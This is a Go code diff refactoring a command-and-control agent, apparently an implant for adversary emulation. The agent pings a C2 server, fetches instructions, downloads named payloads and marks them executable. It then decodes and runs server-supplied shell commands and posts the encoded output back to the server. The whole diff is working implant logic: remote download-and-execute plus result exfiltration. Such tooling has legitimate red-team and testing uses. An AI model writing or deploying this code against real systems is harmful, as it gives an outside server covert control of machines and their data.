@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"net/http"
 	"os"
@@ -17,10 +16,22 @@ import (
 )
 
 const (
-	OK = 200
+	ok = 200
 )
 
-// Instructions is a single call to the C2
+//Ping tests connectivity to the server
+func Ping(server string) bool {
+	address := fmt.Sprintf("%s/sand/ping", server)
+	bites := request(address, nil)
+	if(string(bites) == "pong") {
+		fmt.Println("[+] Connectivity established")
+		return true;
+	}
+	fmt.Println("[+] Connectivity not established")
+	return false;
+}
+
+//Instructions is a single call to the C2
 func Instructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
@@ -39,30 +50,24 @@ func Instructions(profile map[string]interface{}) map[string]interface{} {
 	return out
 }
 
-// Drop the payload
-func Drop(server string, payload string) string {
-	location := filepath.Join(payload)
-	if len(payload) > 0 && util.Exists(location) == false {
-		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
-		req, _ := http.NewRequest("POST", address, nil)
-		req.Header.Set("file", payload)
-		req.Header.Set("platform", string(runtime.GOOS))
-		client := &http.Client{}
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == OK {
-			writePayload(location, resp)
+//DropPayloads downloads all required payloads for a command
+func DropPayloads(payload string, server string) []string{
+	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
+	var droppedPayloads []string
+	for _, payload := range payloads {
+		if len(payload) > 0 {
+			droppedPayloads = append(droppedPayloads, drop(server, payload))
 		}
 	}
-	return location
+	return droppedPayloads
 }
 
-// Execute executes a command and posts results
-func Execute(profile map[string]interface{}, command map[string]interface{}, payloads []string) {
+//ExecuteInstruction takes the command and profile and executes that command step
+func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
 	cmd := string(util.Decode(command["command"].(string)))
 	var status string
 	var result []byte
-	missingPaths := checkPayloadsAvailable(payloads)
+	missingPaths := util.CheckPayloadsAvailable(payloads)
 	if len(missingPaths) == 0 {
 		result, status = execute.Execute(cmd, command["executor"].(string), profile["platform"].(string))
 	} else {
@@ -72,22 +77,26 @@ func Execute(profile map[string]interface{}, command map[string]interface{}, pay
 	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
 }
 
-// ExecuteInstruction takes the command and profile and executes that command step
-func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}) {
-	fmt.Printf("[*] Running instruction %.0f\n", command["id"])
-	payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
-	var droppedPayloads []string
-	for _, payload := range payloads {
-		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, Drop(profile["server"].(string), payload))
+func drop(server string, payload string) string {
+	location := filepath.Join(payload)
+	if len(payload) > 0 && util.Exists(location) == false {
+		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
+		address := fmt.Sprintf("%s/file/download", server)
+		req, _ := http.NewRequest("POST", address, nil)
+		req.Header.Set("file", payload)
+		req.Header.Set("platform", string(runtime.GOOS))
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err == nil && resp.StatusCode == ok {
+			util.WritePayload(location, resp)
 		}
 	}
-	Execute(profile, command, droppedPayloads)
+	return location
 }
 
-func sendExecutionResults(command_id interface{}, server interface{}, result []byte, status string, cmd string) {
+func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string) {
 	address := fmt.Sprintf("%s/sand/results", server)
-	link := fmt.Sprintf("%f", command_id.(float64))
+	link := fmt.Sprintf("%f", commandID.(float64))
 	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
 	request(address, data)
 	if cmd == "die" {
@@ -105,21 +114,4 @@ func request(address string, data []byte) []byte {
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
 	return util.Decode(string(body))
-}
-
-func writePayload(location string, resp *http.Response) {
-	dst, _ := os.Create(location)
-	defer dst.Close()
-	_, _ = io.Copy(dst, resp.Body)
-	os.Chmod(location, 0500)
-}
-
-func checkPayloadsAvailable(payloads []string) []string {
-	var missing []string
-	for i := range payloads {
-		if util.Exists(filepath.Join(payloads[i])) == false {
-			missing = append(missing, payloads[i])
-		}
-	}
-	return missing
 }
